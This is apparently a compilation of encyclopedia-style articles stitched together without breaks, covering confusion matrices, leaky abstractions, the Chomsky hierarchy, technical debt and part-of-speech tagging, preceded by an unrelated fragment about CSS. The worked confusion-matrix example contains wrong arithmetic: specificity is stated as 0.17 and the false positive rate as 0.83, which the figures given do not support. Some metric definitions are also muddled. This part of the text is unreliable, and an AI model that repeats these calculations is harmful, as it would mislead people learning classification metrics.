She does this by adjusting the CSS ` border - radius ` using prime numbers in CSS selectors .
Confusion Matrix .
Source : Idris 2018 .
In statistical classification , we create algorithms or models to predict or classify data into a finite set of classes .
Since models are not perfect , some data points will be classified incorrectly .
The Confusion matrix is basically a tabular summary showing how well the model is performing .
On one dimension , the matrix takes the actual values .
The matrix then maps these to the predicted values in the other dimension .
In reality , the matrix is like a histogram .
The entries in the matrix are counted .
For example , it records how many data points were predicted as " true " when they were actually " false " .
The Confusion matrix is useful in both binary classification as well as multiclass classification problems .
There are many performance metrics that can be computed from the matrix .
Learning these metrics is handy for a statistician or data scientist .
What are the elements and terminology used in Confusion Matrix ?
Illustrating basic terms of a confusion matrix .
Source : Narkhede 2018 .
Let 's also consider a concrete example of a pregnancy test .
Based on a urine test , we predict if a person is pregnant or not .
We assume that the ground truth ( pregnant or not ) is available to us .
We therefore have four possibilities : True Positive ( TP ) : We predict a pregnant person is pregnant .
This is a good prediction .
True Negative ( TN ) : We predict a non - pregnant person is not pregnant .
This is a good prediction .
False Positive ( FP ) : We predict a non - pregnant person is pregnant .
This type of error is also called a Type I Error .
False Negative ( FN ) : We predict a pregnant person is not pregnant .
This type of error is also called Type II Error .
When these are arranged in matrix form , it will be apparent that correct predictions are represented along the main diagonal .
Incorrect predictions are in the non - diagonal cells .
This makes it easy to see where predictions have gone wrong .
We may also say that the matrix represents the model 's inability to classify correctly , and hence the " confusion " in the model .
What metrics are used for evaluating the performance of a prediction model ?
Illustrating the many metrics calculated from the confusion matrix .
Source : Devopedia 2019 .
Performance metrics from a confusion matrix are represented in the following equations : $ $ Recall\ or\ Sensitivity = TP/(TP+FN)=TP / AllPositives\\Specificity = TN/(TN+FP)=TN / AllNegatives\\Precision = TP/(TP+FP)=TP / PredictedPositives\\Prevalence = TP+FN / Total = AllPositives /Total\\Accuracy=(TP+TN)/Total\\Error\ Rate=(FP+FN)/Total$$ It 's important to understand the significance of these metrics .
Accuracy is an overall measure of correct prediction , regardless of the class ( positive or negative ) .
The complement of accuracy is error rate or misclassification rate .
High recall implies that very few positives are misclassified as negatives .
High precision implies very few negatives are misclassified as positives .
There 's a trade - off here .
If the model is partial towards positives , we 'll end up with high recall but low precision .
Its model favours negatives , we 'll end up with low recall and high precision .
High specificity , like high precision , implies that very few negatives are misclassified as positives .
If positive represents some disease , specificity is the model 's confidence in clearing a person as disease - free .
Selectivity is the model 's confidence in diagnosing a person as a diseased .
Ideally , recall , specificity , precision and accuracy should all be close to 1 .
The FNR , FPR and error rate should be close to 0 .
Could you give a numerical example showing calculations of performance measures of a prediction model ?
Example confusion matrix with sample values .
Source : Markham 2014 .
This example has 165 samples .
We show the following calculations : Recall or True Positive Rate ( TPR ) : TP/(TP+FN ) = 100/(100 + 5 ) = 0.95 False Negative Rate ( FNR ) : 1 - TPR = 0.05 Specificity or True Negative Rate ( TNR ) : TN/(TN+FP ) = 50/(50 + 10 ) = 0.17 False Positive Rate ( FPR ) : 1 - TNR = 0.83 Precision : TP/(TP+FP ) = 100/(100 + 10 ) = 0.91 Prevalence : ( TP+FN)/Total = ( 100 + 5)/165 = 0.64 Accuracy : ( TP+TN)/Total = ( 100 + 50)/165 = 0.91 Error Rate : ( FP+FN)/Total = ( 10 + 5)/165 = 0.09 Why do we need so many performance measures when accuracy can be sufficient ?
A Normalized confusion matrix is useful when there 's class imbalance .
Source : Scikit - learn 2019b .
If the dataset has 90 % positives , then achieving 90 % accuracy is easy by predicting only positives .
Thus , accuracy is not a sufficient measure when dataset is imbalanced .
Accuracy also does n't differentiate between Type I ( False Positive ) and Type II ( False Negative ) errors .
This is where the confusion matrix gives us more useful measures with FPR and FNR ; or their complementary measures , Recall and Specificity respectively .
Consider the multiclass problem of iris classification that has three classes : setosa , versicolor and virginica .
This has an accuracy of 84 % ( 32/38 ) but it does n't tell us where the errors are happening .
With the confusion matrix , it 's easy to see that only versicolor is wrongly classified .
The matrix also shows that versicolor is misclassified as virginica and never as setosa .
We can also see that Recall is 62 % ( 10/16 ) for versicolor .
In fact , when classes are not evenly represented in the data , the confusion matrix by itself does n't give an adequate visual representation .
For this reason , we use a normalized confusion matrix that takes care of class imbalance .
What are other performance metrics for a classification / prediction problem ?
The F - measure takes the harmonic meaning of Recall and Precision , ( 2*Recall*Precision)/(Recall+Precision ) .
It 's a value closer to the smaller of the two .
Applying this to our earlier example , we get F - measure = ( 2 * 0.95 * 0.91)/(0.95 + 0.91 ) = 0.92 A commonly used graphical measure is the ROC Curve .
It 's generated by plotting the True Positive Rate ( y - axis ) against the False Positive Rate ( x - axis ) as we vary the threshold for assigning observations to a given class .
How often will we be wrong if we always predict the majority class ?
The Null Error Rate gives us a measure of this .
It 's a useful baseline when evaluating a model .
In our example , the null error rate would be 60/165 = 0.36 .
If the model always predicted positive , it would be wrong 36 % of the time .
Cohen 's Kappa can be applied to know how well a classifier is performing , as opposed to classifying simply by chance .
A high Kappa score implies accuracy differs a lot from null error rate .
What 's the procedure for making or using a Confusion Matrix ?
Confusion matrix for multiclass classification .
Source : Krüger 2016 , table 5.1 .
We certainly need both the actual values and the predicted values .
We can arrange the actual values by rows and the predicted values by columns , although some may swap the two .
It 's therefore important to read the arrangement of the matrix correctly .
For each actual value , count the number of predicted values for each class .
Fill these counts into the matrix .
There 's no threshold for good accuracy , sensitivity or other measures .
They should be interpreted in the context of problem , domain and business .
Could you mention some tools and techniques in relation to the Confusion Matrix ?
In R , package caret : Classification and Regression Training can be used to get confusion matrix with all relevant statistical information .
The function is ` confusionMatrix(data = predicted , reference = expected ) ` .
This plots actuals ( called reference ) by columns and predictions by rows .
In Python , package sklearn.metrics has an equivalent function , ` confusion_matrix(actual , predicted ) ` .
These plots are actuals by rows and predictions by columns .
Other related and useful functions are ` accuracy_score(actual , predicted ` ) and ` classification_report(actual , predicted ) ` .
Contingency or correlation between hair colours of siblings .
Source : Pearson 1904 , table VI .
Mathematician Karl Pearson publishes a paper titled On the theory of contingency and its relation to association and normal correlation .
Contingency and correlation between two variables can be seen as the genesis of the confusion matrix .
The Confusion matrix is useful in multiclass problems .
Source : Townsend 1971 , table 2 .
James Townsend publishes a paper titled Theoretical analysis of an alphabetic confusion matrix .
Uppercase English alphabets are shown to human participants who try to identify them .
Alphabets are presented with or without introduced noise .
The resulting confusion matrix is 26x26 .
With noise , Townsend finds that ' W ' is misidentified as ' V ' 37 % of the time ; 32 % of ' Q ' are misidentified as ' O ' ; ' H ' is identified correctly only 19 % of the time .
The term Confusion Matrix became popular in the ML community when it appears in a glossary featured in Special Issue on Applications of Machine Learning and the Knowledge Discovery Process by Ron Kohavi and Foster Provost .
In a paper titled Comparing Multi - class Classifiers : On the Similarity of Confusion Matrices for Predictive Toxicology Applications , researchers show how to compare predictive models based on their confusion matrices .
For lower FNR , they propose regrouping performance measures of multiclass classifiers into a binary classification problem .
Illustrating leaky abstractions .
Source : Adapted from Bräutigam 2017 .
In any large system with many components , it 's impossible to keep in view full implementation details of all components .
To manage complexity better , it 's helpful to abstract away the details of other components when working on a particular component .
Each component talks to other components via interfaces without worrying about the implementation details of those components .
It 's for this reason that abstractions are used .
Sometimes an abstraction is not perfect .
When an abstraction fails to hide some of the underlying implementation details , we call this a leaky abstraction .
In this case , client users of that interface will experience wrong or unsatisfactory behaviour .
Clients can mitigate this by considering implementation details behind the interface and changing the way they use the interface .
Could you explain leaky abstractions with an example ?
An explanation of leaky abstractions .
Source : MPJ 2016 .
Let 's take the example of hashing that takes plaintext and produces a hash out of it .
This problem is so well defined that application programmers rarely need to write their own implementation .
Many libraries are available for hashing and their interfaces nicely abstract away the implementations .
Programmers rarely need to bother about how the hashing is implemented .
They can simply treat hashing as a " black box " .
Hashing is an example of a good abstraction .
An example of a leaky abstraction is Axios that wraps the fetch JavaScript API in browsers .
When there 's an HTTP error , Axios will coerce it into a JavaScript error .
This behaviour is different from fetch , which treats even HTTP 404 responses as successful responses .
Axio behaviour may work for many use cases , but it 's not the general case .
Some applications may not want this behaviour .
Consider a database search .
A MySQL query containing ` LIKE ' abc% ' ` is fast but one containing ` LIKE ' % abc% ' ` is slow .
This is because indices use binary trees in which the latter search is not optimized .
Thus , the implementation is exposed and clients have to be aware of this .
Which are the different types of leaky abstractions ?
A leaky abstraction at the service layer .
Source : Nadel 2016 .
In some examples of leaky abstractions , we find that performance is affected .
A MySQL query may run a lot slower than expected .
An array access may take a lot longer than expected .
In other examples , we find that the behaviour is not as expected of the abstraction .
An HTTP 404 status code is coerced into a JavaScript error .
A database orchestration layer promises support for transactions when , in fact , it ca n't achieve this when dealing with multiple SQL and NoSQL databases .
A single call to the service layer results in six HTTP calls when in fact the caller expects only one .
Another variant , or perhaps a related leak , is called technical leak .
This can be stated as " it compiles , but does n't work " .
For example , an interface would work only if the methods are called in a certain order .
This is a technical leak that 's called temporal coupling .
Another example is initializing an object before using it or closing a database before destroying the object .
Technical leaks require developers to learn something about the implementation even when it has nothing to do with business logic .
What does the Law of Leaky Abstractions say ?
This is a phrase coined by Joel Spolsky in 2002 .
It says , all non - trivial abstractions , to some degree , are leaky .
Spolsky gives many examples where leaky abstractions arise .
TCP provides higher layers of reliable transport and delivery of packets .
However , TCP ca n't do anything if a cable is cut or there 's an overloaded hub along the way .
The abstraction therefore leaks .
When iterating over a 2-D array , performance should n't differ if you iterate by rows versus by columns .
Ideally , a programmer should not care about how the array is stored in memory .
In reality , when virtual memory is involved and page faults happen , some memory access may take a lot longer .
The C++ string class is another example of leaky abstraction .
They 're not first - class data types .
In a string instance , we can do ` s + " bar " ` but when we do ` " foo " + " bar " ` we have to recognize that strings are really ` char * ` underneath .
In conclusion , abstractions are good when writing code , but we still have to learn what 's underneath them .
High - level languages with abstractions are paradoxically harder to work with since we have to learn what these abstractions are attempting to hide .
How can developers overcome leaky abstractions ?
Abstractions reduce complexity , but they 're not perfect .
If an abstraction leaks too much , remove it or create a better one .
If you 're writing an abstraction , document its limitations .
Abstractions are good , but having too many adds complexity . . As noted by David J. Wheeler , all problems in computer science can be solved by another level of indirection , except for the problem of too many layers of indirection .
Given that at least some abstractions will leak , developers could create a wrapper around the abstraction .
The application is required to call this wrapper rather than the original abstraction .
This wrapper would modify the behaviour into what the application expects .
In a more extreme case , the developer reimplements the functionality to suit the application .
This is not good practice since , with the loss of the abstraction , the application becomes more complex .
Another approach is to code between the lines .
The developer understands the implementation behind the abstraction ( such as how memory is allocated ) and contorts the code to suit that implementation .
Code becomes more complex , less readable and less portable to other platforms .
The fact that abstractions leak is recognized in the design of high - level programming languages that tend to abstract low - level details .
A quote by Niklaus Wirth is relevant here . I found a large number of programs perform poorly because of the language ’s tendency to hide “ what is going on ” with the misguided intention of “ not bothering the programmer with details .
” In the context of programming languages , some decisions taken by language designers are seen to be pre - emptive , that is , they constrain developers from using the language in a specific way .
For example , a developer needs two triangular arrays but is forced to use two rectangular arrays ( more memory ) or pack them into a single rectangular array ( complex code ) .
We may say that the abstraction provided by the language does n't suit such specialized use cases .
An open implementation is based on a dual - interface framework .
Source : Kiczales 1992 , fig .
5 .
Gregor Kiczales explains leaky abstractions at a workshop .
He proposes to divide abstraction into two parts : one that does abstraction in the traditional way and another that allows clients some control over the implementation .
He calls this an open implementation supported by meta - level architectures and metaobject protocols .
For designing meta - level interfaces , he notes four design principles : scope control , conceptual separation , incrementality and robustness .
Joel Spolsky on his blog Joel on Software coins and explains the phrase " Law of Leaky Abstractions " .
Ryan Bemrose of Microsoft states a corollary to the Law of Leaky Abstractions , " An abstraction should not hide or disable that which it abstracts " .
He gives an example of an IRC bot that could interface with third - party plugins .
The IRC protocol itself is abstracted via an object - oriented interface .
It 's discovered that plugins that use custom modes ca n't function properly because such functionality was disabled by abstraction .
Abstractions are useful , but we should n't attempt to abstract away everything .
At the ContainerWorld 2017 conference , one speaker notes that containers are also leaky abstractions .
Processes running inside containers have to sometimes know about I / O performance , versions , configurations , garbage collection of old images , etc .
In one example , it 's seen that two containers contending for the same IO are affected .
Noam Chomsky on Languages .
Source : Shameem .
2018 .
Any language is a structured medium of communication , whether it is a spoken or written natural language , sign or coded language , or a formal programming language .
Languages are characterised by two basic elements – syntax ( grammatical rules ) and semantics ( meaning ) .
In some languages , the meaning might vary depending upon a third factor called context of usage .
Depending on restrictions and complexity present in the grammar , languages find a place in the hierarchy of formal languages .
Noam Chomsky , the celebrated American linguist cum cognitive scientist , defined this hierarchy in 1956 and hence it 's called the Chomsky Hierarchy .
Although his concept is quite old , there 's renewed interest because of its relevance to Natural Language Processing .
The Chomsky hierarchy helps us answer questions like “ Can a natural language like English be described ( ‘ parsed ’ , ‘ compiled ’ ) with the same methods as used for formal / artificial ( programming ) languages in computer science ?
” What are the different levels in the Chomsky hierarchy ?
Chomsky Hierarchy Levels .
Source : Fitch .
2014 .
There are 4 levels – Type-3 , Type-2 , Type-1 , Type-0 .
With every level , the grammar becomes less restrictive in rules , but more complicated to automate .
Every level is also a subset of the subsequent level .
Type-3 : Regular Grammar - the most restrictive of the set , they generate regular languages .
They must have a single non - terminal on the left - hand side and the right - hand - side consisting of a single terminal or single terminal followed by a single non - terminal .
Type-2 : Context - Free Grammar - generates context - free languages , a category of immense interest to NLP practitioners .
Here all the rules take the form A → β , where A is a single non - terminal symbol and β is a string of symbols .
Type-1 : Context - Sensitive Grammar - the highest programmable level , they generate context - sensitive languages .
They have rules of the form α A β → α γ β with A as a non - terminal and α , β , γ as strings of terminals and non - terminals .
Strings α , β may be empty , but γ must be nonempty .
Type-0 : Recursively enumerable grammar - is too generic and unrestricted to describe the syntax of either programming or natural languages .
What are the common terms and definitions used while studying the Chomsky Hierarchy ?
Symbols - Letters , digits , single characters .
Example - A , b,3 String - Finite sequence of symbols .
Example - Abcd , x12 Production Rules - Set of rules for every grammar describing how to form strings from the language that are syntactically valid .
The Terminal - the smallest unit of a grammar that appears in production rules , can not be further broken down .
Non - terminal - Symbols that can be replaced by other non - terminals or terminals by successive application of production rules .
Grammar - Rules for forming well - structured sentences and the words that make up those sentences in a language .
A 4-tuple G = ( V , T , P , S ) such that V = Finite non - empty set of non - terminal symbols , T = Finite set of terminal symbols , P = Finite non - empty set of production rules , S = Start symbol Language - Set of strings conforming to a grammar .
Programming languages have finite strings , most natural languages are seemingly infinite .
Example – Spanish , Python , Hexadecimal code .
Automaton - Programmable version of a grammar governed by pre - defined production rules .
It has clearly set computing requirements for memory and processing .
Example – Regular automaton for regex .
What are the corresponding language characteristics at each level ?
Languages , Automaton , Grammar , Recognition .
Source : Hauser and Watumull 2016 , fig .
1 .
Under Type-3 grammar , we do n't classify entire languages as the production rules are restrictive .
However , constructs inside a language describable by regular expressions come under this type .
For instance , the rule for naming an identifier in a programming language – regular expression with any combination of case - insensive letters , some special characters and numbers , but must start with a letter .
Context - free languages classified as Type-2 are capable of handling an important language construct called nested dependencies .
English example – Recursive presence of “ If & lt;phrase > then & lt;phrase > ” – “ If it rains today and if I do n’t carry an umbrella , then I 'd get drenched ” .
For programming languages , the matching parentheses of functions or loops get covered by this grammar .
In Type-1 languages , placing the restriction on productions α → β of a phrase structure that β be at least as long as α , they become context sensitive .
They permit replacement of α by β only in a ‘ context ’ , [ context ] α [ context ] → [ context ] β [ context ] .
Finally , Type-0 languages have no restrictions on their grammar and may loop forever .
They do n’t have an algorithm for enumerating all the elements .
What is the type of Automaton that recognizes the grammar at each level ?
Type-3 : Finite - State Automata - To compute constructs for a regular language , the most important consideration is that there is no memory requirement .
Think of a single - purpose vending machine for platform tickets or a lift algorithm .
The automaton knows the present state and next permissible status , but does not ‘ remember ’ past steps .
Type-2 : Push - Down Automata - In order to match nested dependencies , this automaton requires a one - ended memory stack .
For instance , to match the number of ‘ if ’ and ‘ else ’ phrases , the automaton needs to ‘ remember ’ the latest occurring ‘ if ’ .
Only then can it find the corresponding ‘ else ’ .
Type-1 : Linear - Bounded Automata - is a form of a restricted Turing machine which , instead of being unlimited , is bounded by some computable linear function .
The advantage of this automaton is that its memory requirement ( RAM upper limit ) is predictable even if the execution is recursive in parts .
Type-0 : Turing Machine - Non - computable functions exist in Mathematics and Computer Science .
The Turing machine , however , allows representing even such functions as a sequence of discrete steps .
Control is finite even if data might be seemingly infinite .
Can you give a quick example of each type of grammar / language ?
Type-3 : Regex to define tokens such as identifiers , language keywords in programming languages .
A coin vending machine that accepts only 1-Rupee , 2-Rupee and 5-Rupee coins has a regular language with only three words – 1 , 2 , 5 .
Type-2 : Statement blocks in programming languages , such as functions in parentheses , If - Else , for loops .
In natural language , nouns and their plurals can be recognized through one NFA , verbs and their different forms can be recognized through another NFA , and then combined .
Singular ( The girl runs home – > Girl + Runs ) .
Plural ( The girls run home – > Girls + Run ) Type-1 : Though most language constructs in natural language are context - free , in some situations , linear matching of tokens has to be done , such as - " The square roots of 16 , 9 and 4 are 4 , 3 and 2 , respectively .
" Here 16 is to be matched with 4 , 9 is matched with 3 , and 4 is matched with 2 .
Type-0 : A language with no restrictions is not conducive to communication or automation .
Hence , there are no common examples of this type .
However , some mathematical seemingly unsolvable equations are expressed in this form .
At which level of the hierarchy do formal programming languages fall ?
Reading a text file containing a high - level language program and compiling it as per its syntax is done in two steps .
Finite state models associated with Type-3 grammar are used for performing the first step of lexical analysis .
Raw text is aggregated into keywords , strings , numerical constants and identifiers in this step .
In the second step , to parse the program constructs of any high level language according to its syntax , a Context - Free Grammar is required .
Usually this grammar is specified in Backus - Naur Form ( BNF ) .
For example , to build a grammar for IF statement , grammar would begin with a non - terminal statement S. Rules will be of the form : S → IF - STATEMENT IF - STATEMENT → if CONDITION then BLOCK endif BLOCK → STATEMENT | BLOCK ; Conventionally , all high - level programming languages can be covered under the Type-2 grammar in Chomsky ’s hierarchy .
The Python language has a unique feature of being white - space sensitive .
To make this feature fit into a conventional CFG , Python uses two additional tokens , ‘ INDENT ’ and ‘ DEDENT ’ to represent the line indentations .
However , just syntactic analysis does not guarantee that the language will be entirely ‘ understood ’ .
Semantics need to match too .
Where can we place natural languages in the hierarchy ?
Natural languages are an infinite set of sentences constructed out of a finite set of characters .
Words in a sentence do n’t have defined upper limits either .
When natural languages are reverse engineered into their component parts , they get broken down into 4 parts - syntax , semantics , morphology , phonology .
Tokenising words and identifying nested dependencies work as explained in the previous section .
Part - of - Speech Tagging is a challenge .
“ He runs 20 miles every day ” and “ The batsman scored 150 runs in one day ” – the same word ‘ runs ’ becomes a noun and verb .
Finite state grammar can be used for resolving such lexical ambiguity .
Identifying cases ( subjective - I , possessive - Mine , objective - Me , etc ) for nouns varies across languages .
Old English has 5 , Modern English – 3 , Sanskrit and Tamil - clearly defined 8 cases .
Each case also has interrogative forms .
A clear definition of cases enables free word order .
The CFG defined for these languages takes care of this .
Natural languages are believed to be at least context - free .
However , Dutch and Swiss German contain grammatical constructions with cross - serial dependencies which make them context sensitive .
Languages having a clear and singular source text of grammar are easier to classify .
Are there any exceptional cases in natural languages that make their classification ambiguous ?
NLP practitioners have successfully managed to assign a majority of natural language aspects to the regular and CFG category .
However , some aspects do n't easily conform to a particular grammar and require special handling .
Structural ambiguity – Example ‘ I saw the man with the telescope ’ .
A CFG can assign two or more phrase structures ( “ parse trees ” ) to one and the same sequence of terminal symbols ( words or word classes ) .
Ungrammatical speech – Humans often talk in sentences that are incorrect grammatically .
Missing words are sometimes implied in a sentence , not uttered explicitly .
So decoding such sentences is a huge challenge as they do n't qualify as per any defined grammar , but a native speaker can easily understand them .
Sarcasm or proverb usage – When we say something but mean something entirely different .
Here the semantic analysis becomes critical .
We do n’t build grammar for these cases , we just prepare an exhaustive reference data set .
Mixed language use – Humans often mix words from multiple languages .
So computing systems need to identify all the constituent language words present in the sentence and then assign them to their respective grammar .
What are the important extensions to the Chomsky hierarchy that find relevance in NLP ?
Mildly Context Sensitive Languages .
Source : Jäger and Rogers .
2012 .
There are two extensions to the traditional Chomsky hierarchy that have proved useful in linguistics and cognitive science : Mildly context - sensitive languages - CFGs are not adequate ( weakly or strongly ) to characterize some aspects of language structure .
To derive extra power beyond CFG , a grammatical formalism called Tree Adjoining Grammars ( TAG ) was proposed as an approximate characterization of Mildly Context - Sensitive Grammars .
It is a tree generating system that factors recursion and the domain of dependencies in a novel way , leading to ' localization ' of dependencies , their long distance behaviour following from the operation of composition , called ' adjoining ' .
Another classification called Minimalist Grammars ( MG ) describes an even larger class of formal languages .
Sub - regular languages - A sub - regular language is a set of strings that can be described without employing the full power of finite state automata .
Many aspects of human language are manifestly sub - regular , such as some ‘ strictly local ’ dependencies .
Example – identifying recurring sub - string patterns within words is one such common application .
Avram Noam Chomsky was born on December 7 , 1928 .
Decades later , Chomsky is credited with the creation of the theory of generative grammar , considered to be one of the most significant contributions to the field of linguistics made in the 20th Century .
Turing machines , first described by Alan Turing in 1936–7 , are simple abstract computational devices intended to help investigate the extent and limitations of what can be computed .
Chomsky publishes Syntactic Structures .
He defines a classification of formal languages in terms of their generative power , to be known as the Chomsky hierarchy .
John Backus and Peter Naur introduce for the first time a formal notation to describe the syntax of a given language ( for ALGOL 60 programming language ) .
This is said to be influenced by Chomsky 's work .
In time , this notation is called Backus - Naur Form .
Technical debt as cruft .
Source : Fowler 2019 .
To write good software , developers have to follow best practices : architecture , design patterns , code structure , naming convention , coding guidelines , test coverage , documentation , etc .
In practice , business needs may push developers to release a functioning product as quickly as possible .
Developers may violate the best practices , hoping to make improvements at a later time .
When this happens , we have technical debt .
The goal is not to eliminate technical debt .
We accept technical debt in the short term and manage it in the long term .
If it 's ignored , problems will accumulate until demoralized developers , missed deadlines , unhappy customers and increasing costs drive the product out of the market .
The problems indicated by technical debt are related to many other terms : software maintenance , software evolution , software aging , code decay , code reengineering , design smells , code refactoring , deficit programming , and technical inflation .
Why do we call technical debt a " debt " ?
Cunningham explains the debt metaphor .
Source : Cunningham 2009 .
The debt metaphor comes from finance .
It 's common for companies to borrow money to grow faster and capture the market quickly .
However , this debt has to be eventually repaid with interest .
The longer the company delays the repayment , the more it pays in terms of interest .
Ward Cunningham applied this debt metaphor to technology , more specifically to software development .
For various reasons , developers might not adopt the best approach to building their product .
They might release the product even when they do n't understand some parts of it .
This is the debt they acquire in the hope that they will fix these issues in a future release .
Bad code and poor understanding of that code lead to more time and effort to add new features .
This is the interest paid on the debt .
An hour saved today would require more than an hour tomorrow to fix the problem .
Code refactoring leads to better design that 's easy to understand and maintain .
However , the longer they postpone this refactoring , the more difficult it becomes to refactor , just as interest payments continue to grow in financial debt .
What 's the principal and interest with respect to technical debt ?
In finance , when we borrow money , the principal has to be paid along with interest .
The longer we delay the payment of principal , the more interest we pay .
In technical debt , suppose we keep working with poor code , design or documentation .
Interest is the extra effort we pay to maintain the software .
As the software gets more complex with each release , interest keeps going up .
Instead , we could refactor the code incrementally and make it better for future maintenance .
Principal is therefore the cost of refactoring .
Paying the principal today reduces future interest payments ( extra effort ) .
How does technical debt arise in a project ?
Technical debt in a vicious cycle .
Source : Sharma 2018 .
Technical debt could arise due to " business pressure , incorrect design decisions , postponing refactoring indefinitely , updating dependencies or simply the lack of experience of the developer " .
Bad practices can lead to technical debt : starting development without proper design , lack of testing , poor documentation , or poor collaboration .
A software product may start with a clean design but incur technical debt as requirements change .
Sometimes a software component can undergo a number of incremental changes made by multiple developers .
These developers may not fully understand that component or its original purpose .
Some call this " bit rot technical debt " .
Coding by copy - paste is a symptom .
Sometimes a third - party software is upgraded in an incompatible manner , such as Magento 1.x to 2.0 .
All websites using Magento 1.x now have a technical debt since there 's no simple upgrade path .
Consider a web application .
Though Ajax might be the right approach , it would take longer to develop .
So developers use frames instead .
This is a conscious decision that incurs technical debt .
Developers must still implement a clean solution that can be migrated to Ajax easily in a future release .
What are the different types of technical debt ?
The four quadrants of technical debt .
Source : Fowler 2009 .
Back in 2009 , Martin Fowler identified four types of technical debt : Reckless & Deliberate : Developers are aware of good design practices but deliberately choose to ignore them and produce messy code .
This leads to excessive interest payments and a long time to payback the principal .
Reckless & Inadvertent : Developers are clueless about good design practices and produce messy code .
Prudent & Deliberate : Developers will incur debt because they estimate that interest payments are small ( rarely touched code ) .
They do a cost - benefit analysis and accept the debt if it can be overcome .
Prudent & Inadvertent : This is often retrospective in nature .
Developers release clean code but later realize that they could have done it differently .
This is inadvertent debt .
Developers are constantly learning and trying to improve their code .
As systems evolve and requirements change , developers may find better designs .
From the perspective of interest payment , we could classify technical debt as eventually repaid ( refactoring on a daily basis , debt tends to zero ) , sustainable ( refactoring regularly , debt is constant ) or compound growth ( adding new features but not refactoring , exponential growth of debt ) .
Could you share some case studies of technical debt ?
Everyday indicators of technical debt .
Source : Zazworka and Seaman 2012 , slide 16 .
According to a study by Stripe , developers spend nearly half their time fighting technical debt .
They estimated that this amounts to $ 85 billion in annual cost .
Another study of large software organizations showed that 25 % of development time is the cost of technical debt .
Only some used backlogs and static analyzers to manage technical debt .
Very few had a systematic process for addressing technical debt .
Twitter 's platform was built on Ruby on Rails , it was hard to optimize for search performance .
Twitter solved this by eventually switching to a Java server , thus paying off its technical debt .
A Canadian company successfully released a product locally .
When they expanded to the rest of Canada , they had to cater to 20 % of French - speaking Canadians .
They quickly solved this by using a global flag and lots of if - else statements in the code .
Later , they got an order from Japan .
Had they made their software multilingual earlier , they could have easily updated their software for Japanese or any other language .
What are the consequences of technical debt ?
If not managed , technical debt has long term effects on the product .
It becomes difficult to add features or improve the product .
More time is spent on paying off the interest .
Any change implies higher costs .
As product quality deteriorates , system outages or security breaches can lead to lost sales or fines .
The cost of a quick release might be poor design , more bugs , volatile performance , and insufficient testing .
Technical debt has a human cost too .
Developers become unhappy .
Adding new features becomes a pain .
Even when new developers are hired , it takes time to explain what the code does or why it 's so messy .
New developers could start blaming older developers for the technical debt .
Teamwork suffers .
Crippling technical debt might force the team to postpone big changes .
They might not adopt the latest technologies or upgrade to the latest versions of third - party libraries .
Developers might get stuck with outdated frameworks and have no opportunity to upgrade their skills .
They may even leave for better opportunities elsewhere .
Ultimately , these problems can be related to business risk , cost , sales , and employee retention .
Technical debt gives developers a language to communicate clearly with business folks .
How can I manage technical debt within my project ?
Technical debt , if not managed , grows over time .
Source : Frederick 2018 .
Technical debt , when addressed early , requires only some code refactoring .
If this is postponed , a more expensive rewrite may be needed .
As in financial debt , it 's better to pay off the principal to save on future interest payments .
In other words , developers must continuously refactor code .
If a new feature takes three days , a developer could take an extra day to refactor .
This might simplify the current feature and make the code easier to work with in the future .
Once the code is shipped to customers , developers are reluctant to change it , for the fear of breaking system behaviour .
The solution is to add more tests .
In fact , technical debt implies a more disciplined approach towards refactoring and testing .
Developers should follow good design practices : reuse rather than duplicate code ; design highly cohesive and loosely coupled modules ; name variables , classes and methods to reveal intention ; document the code ; organize code reviews .
Unlike bugs , technical debt is often invisible .
Tools such as Designite can help identify and track debt .
Prioritize high - interest debts for refactoring .
Motivate and reward developers for refactoring .
Ward Cunningham coins the term Technical Debt while working on WyCASH+ , a financial software written in Smalltalk and employs object - oriented programming .
He notes that it 's important to revise and rewrite the code towards better understanding .
He also notes , a little debt speeds development so long as it is paid back promptly with a rewrite .
… The danger occurs when the debt is not repaid .
Every minute spent on not - quite - right code counts as interest on that debt .
The Agile Manifesto is signed .
In the following years , as the Agile software movement gains adoption , it also brings more visibility to technical debt .
Technical debt has become an essential concept of software engineering .
Agile is about faster development and responding quickly to customer needs .
This focus on short - term delivery should not compromise long - term goals .
It 's in this context that technical debt becomes relevant in Agile .
Robert C. Martin ( commonly called Uncle Bob ) makes the point that technical debt is incurred due to real - world constraints .
It 's risky but could be beneficial .
It requires discipline and clean coding .
Messy code is not technical debt .
The messy code is due to laziness and unprofessionalism .
Martin Fowler expands on Uncle Bob 's explanation of technical debt .
In the process , he identifies the four quadrants of technical debt .
He also notes that technical debt is a useful metaphor when communicating with non - technical people .
Frequency of types of technical debt in embedded systems .
Source : Ampatzoglou et al .
2016 , fig .
1 .
At the IEEE 8th International Workshop on Managing Technical Debt , researchers presented their findings on technical debt in embedded systems .
They find that tests , architecture and code debts are more common .
In embedded systems , runtime aspects are prioritized more than design aspects .
When the expected lifetime of a component is more than ten years , its maintainability is more seriously considered .
An Example shows POS ambiguity .
Source : Màrquez et al .
2000 , table 1 .
In the processing of natural languages , each word in a sentence is tagged with its part of speech .
These tags then become useful for higher - level applications .
Common parts of speech in English are noun , verb , adjective , adverb , etc .
The main problem with POS tagging is ambiguity .
In English , many common words have multiple meanings and therefore multiple POS .
The job of a POS tagger is to resolve this ambiguity accurately based on the context of use .
For example , the word " shot " can be a noun or a verb .
When used as a verb , it could be in past tense or past participle .
POS taggers started with a linguistic approach but later migrated towards a statistical approach .
State - of - the - art models achieve accuracy of better than 97 % .
POS tagging research done with English text corpus has been adapted to many other languages .
Could you give an overview of POS tagging ?
Architecture diagram of POS tagging .
Source : Devopedia 2019 .
A POS tagger takes a phrase or sentence and assigns the most probable part - of - speech tag to each word .
In practice , input is often pre - processed .
One common pre - processing task is to tokenize the input so that the tagger sees a sequence of words and punctuations .
Other tasks such as stop word removals , punctuation removals and lemmatization may be done before tagging .
The set of predefined tags is called the tagset .
This is essential information that the tagger must be given .
Example tags are NNS for a plural noun , VBD for a past tense verb , or JJ for an adjective .
A tagset can also include punctuations .
Rather than design our own tagset , the common practice is to use well - known tagsets : an 87-tag Brown tagset , 45-tag Penn Treebank tagset , 61-tag C5 tagset , or 146-tag C7 tagset .
In the architecture diagram , we have shown the 45-tag Penn Treebank tagset .
Sketch Engine is a place to download tagsets .
What 's the relevance of POS tagging for NLP ?
Most words in English are unambiguous , but many common words are ambiguous .
Source : Jurafsky and Martin 2009 , fig .
5.10 .
POS tagging is a basic task in NLP .
It 's an essential pre - processing task before doing syntactic parsing or semantic analysis .
It benefits many NLP applications , including information retrieval , information extraction , text - to - speech systems , corpus linguistics , named entity recognition , question answering , word sense disambiguation , and more .
